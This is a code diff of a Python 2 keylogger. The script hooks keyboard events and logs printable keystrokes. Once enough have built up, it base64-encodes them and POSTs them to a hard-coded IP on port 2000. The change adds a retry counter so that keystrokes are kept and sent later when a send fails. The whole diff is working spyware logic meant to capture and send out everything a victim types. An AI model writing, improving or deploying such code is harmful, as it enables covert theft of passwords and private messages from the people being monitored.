@@ -9,15 +9,19 @@ PORT = "2000"
 
 if __name__ == '__main__':
     log = ""
+    line_counter = 50
     def OnKeyPress(event):
         global log
-        if len(log) >= 50:
+        global line_counter
+        if len(log) >= line_counter:
             try:
                 print "sending..."
                 r = requests.post("http://" + IP + ":" + PORT + "/", data=base64.b64encode(log))
                 log = ""
+                line_counter = 50
             except:
-                pass
+                print "Failed..."
+                line_counter += 50
         if event.Ascii > 31 and event.Ascii < 126:
             log += chr(event.Ascii)
         else:
